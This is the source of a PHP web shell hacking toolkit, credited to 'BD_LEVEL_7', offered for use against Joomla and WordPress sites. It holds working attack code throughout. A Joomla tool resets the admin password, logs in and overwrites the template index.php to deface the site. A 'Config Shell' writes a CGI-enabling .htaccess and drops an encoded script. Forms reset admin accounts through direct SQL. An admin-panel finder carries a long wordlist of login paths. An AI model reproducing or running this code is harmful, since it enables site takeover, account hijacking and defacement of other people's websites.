    echo($password);
    echo("<br>");
    echo($dbname);
    echo("<br>");
    echo($dbprefix);
    echo("<br>");
    */
                                                            $co=randomt();

                                                            if ($_POST['form_action'])
                                                            {
                                                                $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";





                                                                $link=mysql_connect("dzoed.druknet.bt",$username,$password) ;

                                                                mysql_select_db($dbname,$link) ;

                                                                $tryChaningInfo = mysql_query("UPDATE ".$dbprefix."users SET username ='admin' , password = '2a9336f7666f9f474b7a8f67b48de527:DiWqRBR1thTQa2SvBsDqsUENrKOmZtAX'");
                                                                echo("<br>[+] Changing admin password to 123456789");

                                                                $req =mysql_query("SELECT * from  `".$dbprefix."extensions` ");

                                                                if ( $req )
                                                                {
                                                                    #################################################################
                                                                    ######################        V1.6         ######################
                                                                    #################################################################


                                                                    $req =mysql_query("SELECT * from  `".$dbprefix."template_styles` WHERE client_id='0' and home='1'");
                                                                    $data = mysql_fetch_array($req);
                                                                    $template_name=$data["template"];

                                                                    $req =mysql_query("SELECT * from  `".$dbprefix."extensions` WHERE name='".$template_name."'");
                                                                    $data = mysql_fetch_array($req);
                                                                    $template_id=$data["extension_id"];

                                                                    $url2=$site_url."/index.php";

                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $url2);
                                                                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 1);
                                                                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                                                                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                                                                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);


                                                                    $buffer = curl_exec($ch);

                                                                    $return=entre2v2($buffer ,'<input type="hidden" name="return" value="','"');
                                                                    $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);

                                                                    ///////////////////////////
                                                                    $url2=$site_url."/index.php";
                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $url2);
                                                                    curl_setopt($ch, CURLOPT_POST, 1);
                                                                    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&return=".$return."&".$hidden."=1");
                                                                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                                                                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                                                                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                                                                    $buffer = curl_exec($ch);

                                                                    $pos = strpos($buffer,"com_config");
                                                                    if($pos === false) {
                                                                        echo("<br>[-] Login Error");
                                                                        exit;
                                                                    }
                                                                    else {
                                                                        echo("<br>[~] Login Successful");
                                                                    }
                                                                    ///////////////////////////
                                                                    $url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $url2);
                                                                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                                                                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                                                                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                                                                    $buffer = curl_exec($ch);

                                                                    $hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);
                                                                    if($hidden2) {
                                                                        echo("<br>[+] index.php file founded in Theme Editor");
                                                                    }
                                                                    else {
                                                                        echo("<br>[-] index.php Not found in Theme Editor");
                                                                        exit;
                                                                    }
                                                                    echo("<br>[*] Updating Index.php .....");
                                                                    $url2=$site_url."/index.php?option=com_templates&layout=edit";

                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $url2);
                                                                    curl_setopt($ch, CURLOPT_POST, 1);
                                                                    curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$h."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");

                                                                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                                                                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                                                                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                                                                    $buffer = curl_exec($ch);

                                                                    $pos = strpos($buffer,'<dd class="message message">');
                                                                    if($pos === false) {
                                                                        echo("<br>[-] Updating Index.php Error");
                                                                        exit;
                                                                    }
                                                                    else {
                                                                        echo("<br>[~] index.php successfully saved");
                                                                    }
                                                                    #################################################################
                                                                    ######################      V1.6  END      ######################
                                                                    #################################################################


                                                                }
                                                                else
                                                                {

                                                                    #################################################################
                                                                    ######################      V1.5           ######################
                                                                    #################################################################

                                                                    $req =mysql_query("SELECT * from  `".$dbprefix."templates_menu` WHERE client_id='0'");
                                                                    $data = mysql_fetch_array($req);
                                                                    $template_name=$data["template"];

                                                                    $url2=$site_url."/index.php";
                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $url2);
                                                                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 1);
                                                                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                                                                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                                                                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                                                                    $buffer = curl_exec($ch);

                                                                    $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);

                                                                    $url2=$site_url."/index.php";
                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $url2);
                                                                    curl_setopt($ch, CURLOPT_POST, 1);
                                                                    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&".$hidden."=1");
                                                                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                                                                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                                                                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                                                                    $buffer = curl_exec($ch);

                                                                    $pos = strpos($buffer,"com_config");

                                                                    if($pos === false) {
                                                                        echo("<br>[-] Login Error");
                                                                        exit;
                                                                    }
                                                                    else {
                                                                        echo("<br>[+] Login Successful");
                                                                    }
                                                                    ///////////////////////////
                                                                    $url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $url2);
                                                                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                                                                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                                                                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                                                                    $buffer = curl_exec($ch);

                                                                    $hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);

                                                                    if($hidden2) {
                                                                        echo("<br>[~] index.php file founded in Theme Editor");
                                                                    }
                                                                    else {
                                                                        echo("<br>[-] index.php Not found in Theme Editor");
                                                                    }

                                                                    echo("<br>[*] Updating Index.php .....");
                                                                    $url2=$site_url."/index.php?option=com_templates&layout=edit";
                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $url2);
                                                                    curl_setopt($ch, CURLOPT_POST, 1);
                                                                    curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$h."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
                                                                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                                                                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                                                                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                                                                    $buffer = curl_exec($ch);

                                                                    $pos = strpos($buffer,'<dd class="message message fade">');
                                                                    if($pos === false) {
                                                                        echo("<br>[-] Updating Index.php Error");
                                                                        exit;
                                                                    }
                                                                    else {
                                                                        echo("<br>[~] index.php successfully saved");
                                                                    }
                                                                    #################################################################
                                                                    ######################      V1.5  END      ######################
                                                                    #################################################################

                                                                }

                                                            }


                                                            function randomt() {

                                                                $chars = "abcdefghijkmnopqrstuvwxyz023456789";
                                                                srand((double)microtime()*1000000);
                                                                $i = 0;
                                                                $pass = '' ;

                                                                while ($i <= 7) {
                                                                    $num = rand() % 33;
                                                                    $tmp = substr($chars, $num, 1);
                                                                    $pass = $pass . $tmp;
                                                                    $i++;
                                                                }

                                                                return $pass;

                                                            }

                                                            function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)

                                                            {

                                                                $ar0=explode($marqueurDebutLien, $text);
                                                                $ar1=explode($marqueurFinLien, $ar0[$i]);
                                                                $ar=trim($ar1[0]);
                                                                return $ar;
                                                            }

                                                        }?>
                                                        <center><br><br>
                                                            <font color="#00ff00" size='+3'><b>+--=[ Automatic Joomla Index Changer BY BD_LEVEL_7 ]=--+</b></font><br><br>
                                                        </center>
                                                        <center><b>
                                                                Link of symlink configuration.php of Joomla<br></b>
                                                            <FORM action=""  method="post">
                                                                <input type="hidden" name="form_action" value="1">
                                                                <input type="text" class="inputz" size="60" name="file" value="http://site.com/sym/home/user/public_html/configuration.php">
                                                                <br>
                                                                <br><b>
                                                                    Admin Control panel url</b><br>
                                                                <input type="text" class="inputz" size="40" name="site_url" value="http://site/administrator"><br>
                                                                <br><b>
                                                                    Your Index Code</b>
                                                                <br>
    <TEXTAREA rows="20" align="center" style="background:black" cols="120" name="code"> your index code
            </TEXTAREA>
                                                                <br>
                                                                <INPUT  class="inputzbut" type="submit" value="Lets Go Deface !!!" name="Submit">
                                                            </FORM>
                                                        </center>
                                                        <script language=JavaScript>m='%09%09%09%09%09%09%09%3C/td%3E%0A%09%09%09%09%09%09%3C/tr%3E%0A%09%09%09%09%09%3C/table%3E%0A%09%09%09%09%3C/td%3E%0A%3C/html%3E';d=unescape(m);document.write(d);</script>
                                                        <?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
                                                        ?>
                                                        <form action="?y=<?php echo $pwd; ?>&amp;x=config" method="post">

                                                            <?php

                                                            echo "<center/><br/><b><font color=#00ff00>+--==[ Config Shell Priv8 SCR ]==--+</font></b><br><br>";

                                                            mkdir('config', 0755);
                                                            chdir('config');
                                                            $kokdosya = ".htaccess";
                                                            $dosya_adi = "$kokdosya";
                                                            $dosya = fopen ($dosya_adi , 'w') or die ("Error cuyy!");
                                                            $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
		
AddType application/x-httpd-cgi .cpc

AddHandler cgi-script .izo
AddHandler cgi-script .izo";
                                                            fwrite ( $dosya , $metin ) ;
                                                            fclose ($dosya);

                                                            $file = fopen("config.izo" ,"w+");
                                                            $write = fwrite ($file ,base64_decode($configshell));
                                                            fclose($file);
                                                            chmod("config.izo",0755);
                                                            echo "<iframe src=config/config.izo width=97% height=100% frameborder=0></iframe>
   </div>";
                                                            }
                                                            /////////////////////////////////////////////////////////////////////////


                                                            ///////////////////////////////////////////////////////////////////////////
                                                            elseif(isset($_GET['x']) && ($_GET['x'] == 'wp-reset'))
                                                            {
                                                            ?>
                                                            <form action="?y=<?php echo $pwd; ?>&amp;x=wp-reset" method="post">

                                                                <?php

                                                                echo "<center/><br/><b><font color=#00ff00>+--==[  Wordpress Reset Password BY BD_LEVEL_7 ]==--+</font></b><br><br>";

                                                                if(empty($_POST['pwd'])){

                                                                    echo "<FORM method='POST'>
<table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL server</th></tr> <tr><td>&nbsp;&nbsp;Hostname</td><td>
<input style='width:220px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input style='width:220px;' class='inputz' type='text' name='database' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input style='width:220px;' class='inputz' type='text' name='username' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input style='width:220px;' class='inputz' type='text' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input style='width:220px;' class='inputz' type='text' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;Pass Baru</td><td>
<input style='width:80px;' class='inputz' type='text' name='pwd' value='123456' />&nbsp;

<input style='width:19%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
</td></tr> </table><br><br><br><br>
";
                                                                }else{
                                                                    $localhost = $_POST['localhost'];
                                                                    $database  = $_POST['database'];
                                                                    $username  = $_POST['username'];
                                                                    $password  = $_POST['password'];
                                                                    $pwd   = $_POST['pwd'];
                                                                    $admin = $_POST['admin'];


                                                                    @mysql_connect($localhost,$username,$password) or die(mysql_error());
                                                                    @mysql_select_db($database) or die(mysql_error());

                                                                    $hash = crypt($pwd);
                                                                    $a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());
                                                                    $a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());
                                                                    $a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 2") or die(mysql_error());
                                                                    $a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 2") or die(mysql_error());
                                                                    $a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 3") or die(mysql_error());
                                                                    $a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 3") or die(mysql_error());
                                                                    $a4s=@mysql_query("UPDATE wp_users SET user_email ='".$SQL."' WHERE ID = 1") or die(mysql_error());


                                                                    if($a4s){
                                                                        echo "<b> Success ..!! :)) sekarang bisa login ke wp-admin</b> ";
                                                                    }

                                                                }


                                                                echo "
   </div>"; }

                                                                elseif(isset($_GET['x']) && ($_GET['x'] == 'jm-reset'))
                                                                {
                                                                ?>
                                                                <form action="?y=<?php echo $pwd; ?>&amp;x=jm-reset" method="post">

                                                                    <?php

                                                                    echo "<center/><br/><b><font color=#00ff00>+--==[  Joomla Reset Password BY BD_LEVEL_7 ]==--+</font></b><br><br>";
                                                                    if(empty($_POST['pwd'])){
                                                                        echo "<FORM method='POST'><table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL </th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
<input style='width:270px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input style='width:270px;' class='inputz' type='text' name='database' value='database' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input style='width:270px;' class='inputz' type='text' name='username' value='db_user' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input style='width:270px;' class='inputz' type='password' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input style='width:270px;' class='inputz' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;pass baru </td><td>sidgifari = 
<input style='width:130px;' class='inputz' name='pwd' value='55da27b4e58da3c94a3c56198a85191d' />&nbsp;

<input style='width:23%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
</td></tr> </table><br><br><br><br>
";
                                                                    }else{
                                                                        $localhost = $_POST['localhost'];
                                                                        $database  = $_POST['database'];
                                                                        $username  = $_POST['username'];
                                                                        $password  = $_POST['password'];
                                                                        $pwd   = $_POST['pwd'];
                                                                        $admin = $_POST['admin'];
                                                                        @mysql_connect($localhost,$username,$password) or die(mysql_error());
                                                                        @mysql_select_db($database) or die(mysql_error());
                                                                        $hash = crypt($pwd);
                                                                        $SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 62") or die(mysql_error());
                                                                        $SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 62") or die(mysql_error());
                                                                        $SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 63") or die(mysql_error());
                                                                        $SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 63") or die(mysql_error());
                                                                        $SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 64") or die(mysql_error());
                                                                        $SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 64") or die(mysql_error());
                                                                        $SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 65") or die(mysql_error());
                                                                        $SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 65") or die(mysql_error());
                                                                        if($SQL){
                                                                            echo "<b>Success : skarang password barunya >>> - (123456)";
                                                                        }
                                                                    }

                                                                    echo "
   </div>";
                                                                    }
                                                                    //////////////////////////////////////////////////////////////////////////////

                                                                    elseif(isset($_GET['x']) && ($_GET['x'] == 'adfin'))
                                                                    {
                                                                    ?>
                                                                    <form action="?y=<?php echo $pwd; ?>&amp;x=adfin" method="post">

                                                                        <?php
                                                                        set_time_limit(0);
                                                                        error_reporting(0);
                                                                        $list['front'] ="admin
adm
admincp
admcp
cp
modcp
moderatorcp
adminare
admins
cpanel
controlpanel";
                                                                        $list['end'] = "admin1.php
admin1.html
admin2.php
admin2.html
yonetim.php
yonetim.html
yonetici.php
yonetici.html
ccms/
ccms/login.php
ccms/index.php
maintenance/
webmaster/
adm/
configuration/
configure/
websvn/
admin/
admin/account.php
admin/account.html
admin/index.php
admin/index.html
admin/login.php
admin/login.html
admin/home.php
admin/controlpanel.html
admin/controlpanel.php
admin.php
admin.html
admin/cp.php
admin/cp.html
cp.php
cp.html
administrator/
administrator/index.html
administrator/index.php
administrator/login.html
administrator/login.php
administrator/account.html
administrator/account.php
administrator.php
administrator.html
login.php
login.html
modelsearch/login.php
moderator.php
moderator.html
moderator/login.php
moderator/login.html
moderator/admin.php
moderator/admin.html
moderator/
account.php
account.html
controlpanel/
controlpanel.php
controlpanel.html
admincontrol.php
admincontrol.html
adminpanel.php
adminpanel.html
admin1.asp
admin2.asp
yonetim.asp
yonetici.asp
admin/account.asp
admin/index.asp
admin/login.asp
admin/home.asp
admin/controlpanel.asp
admin.asp
admin/cp.asp
cp.asp
administrator/index.asp
administrator/login.asp
administrator/account.asp
administrator.asp
login.asp
modelsearch/login.asp
moderator.asp
moderator/login.asp
moderator/admin.asp
account.asp
controlpanel.asp
admincontrol.asp
adminpanel.asp
fileadmin/
fileadmin.php
fileadmin.asp
fileadmin.html
administration/
administration.php
administration.html
sysadmin.php
sysadmin.html
phpmyadmin/
myadmin/
sysadmin.asp
sysadmin/
ur-admin.asp
ur-admin.php
ur-admin.html
ur-admin/
Server.php
Server.html
Server.asp
Server/
wp-admin/
administr8.php
administr8.html
administr8/
administr8.asp
webadmin/
webadmin.php
webadmin.asp
webadmin.html
administratie/
admins/
admins.php
admins.asp
admins.html
administrivia/
Database_Administration/
WebAdmin/
useradmin/
sysadmins/
admin1/
system-administration/
administrators/
pgadmin/
directadmin/
staradmin/
ServerAdministrator/
SysAdmin/
administer/
LiveUser_Admin/
sys-admin/
typo3/
panel/
cpanel/
cPanel/
cpanel_file/
platz_login/
rcLogin/
blogindex/
formslogin/
autologin/
support_login/
meta_login/
manuallogin/
simpleLogin/
loginflat/
utility_login/
showlogin/
memlogin/
members/
login-redirect/
sub-login/
wp-login/
login1/
dir-login/
login_db/
xlogin/
smblogin/
customer_login/
UserLogin/
login-us/
acct_login/
admin_area/
bigadmin/
project-admins/
phppgadmin/
pureadmin/
sql-admin/
radmind/
openvpnadmin/
wizmysqladmin/
vadmind/
ezsqliteadmin/
hpwebjetadmin/
newsadmin/
adminpro/
Lotus_Domino_Admin/
bbadmin/
vmailadmin/
Indy_admin/
ccp14admin/
irc-macadmin/
banneradmin/
sshadmin/
phpldapadmin/
macadmin/
administratoraccounts/
admin4_account/
admin4_colon/
radmind-1/
Super-Admin/
AdminTools/
cmsadmin/
SysAdmin2/
globes_admin/
cadmins/
phpSQLiteAdmin/
navSiteAdmin/
server_admin_small/
logo_sysadmin/
server/
database_administration/
power_user/
system_administration/
ss_vms_admin_sm/
adminarea/
bb-admin/
adminLogin/
panel-administracion/
instadmin/
memberadmin/
administratorlogin/
admin/admin.php
admin_area/admin.php
admin_area/login.php
siteadmin/login.php
siteadmin/index.php
siteadmin/login.html
admin/admin.html
admin_area/index.php
bb-admin/index.php
bb-admin/login.php
bb-admin/admin.php
admin_area/login.html
